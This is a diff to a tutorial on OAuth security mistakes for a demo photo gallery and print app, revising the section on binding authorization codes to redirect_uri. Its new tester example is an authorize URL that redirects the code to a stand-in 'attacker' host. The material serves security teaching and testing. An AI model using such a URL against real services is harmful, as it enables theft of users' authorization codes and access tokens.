@@ -486,7 +486,9 @@ passport.use(new BearerStrategy(
 
 ### Print
 
-Incidentally, the `photoprint` web application also uses the MEAN stack. The print application is a fairly simple application. TODO implement obtaining a profile, authenticating, and storing orders (to illustrate OpenId connect).
+Incidentally, the `photoprint` web application also uses the MEAN stack. The print application is a fairly simple application.
+
+TODO implement obtaining a profile, authenticating, and storing orders (to illustrate OpenId connect).
 
 ## Security Considerations
 
@@ -496,12 +498,18 @@ In this section, we present common security mistakes made when designing/impleme
 
 #### Token Endpoint: Bind the Authorization Code to the RedirectURI
 
-Read Section TODO if you are not familiar with the Authorization Code Grant. Within that flow, the *Client* exchanges an earlier obtained *Authorization Code* for an *Access Token* at the token endpoint of the authorization server. The server sends the access token to the URI that was specified as a parameter in the request (named: `redirect_uri`). The server should validate that this `redirect_uri` is the same as the `redirect_uri` that was used to obtain the *Authorization Code*. If this validation is not done, then an attacker might be able to replay an original request (but modify the *redirect_uri*) and obtain an access token to access the user's resources.
+Read the previous section if you are not familiar with the Authorization Code Grant. Within that flow, the *Client* exchanges an earlier obtained *Authorization Code* for an *Access Token* at the token endpoint of the authorization server. The server sends the access token to the URI that was specified as a parameter in the request (named: `redirect_uri`). The server should validate that this `redirect_uri` is the same as the `redirect_uri` that was used to obtain the *Authorization Code*. If this validation is not done, then an attacker might be able to replay an original request (but modify the *redirect_uri*), obtain an authorization code, and subsequently an access token to access the user's resources.
 
-![Attacker steals the authorization code.](./pics/openredirect_stealauthzcode.gif)
+![Attacker steals a valid authorization code from the victim.](./pics/openredirect_stealauthzcode.gif)
 
-To validate this as a tester, do the following:
-TODO
+![Attacker redirects the victim the victim to a random site.](./pics/openredirect.gif)
+
+To validate this as a tester, change the value of the redirect_uri parameter to one you control:
+
+```html
+http://gallery:3005/oauth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fattacker%3A1337%2Fcallback&scope=email&client_id=photoprint
+```
+
 
 # Mobile Application: Authorization Code Grant with PKCE
 
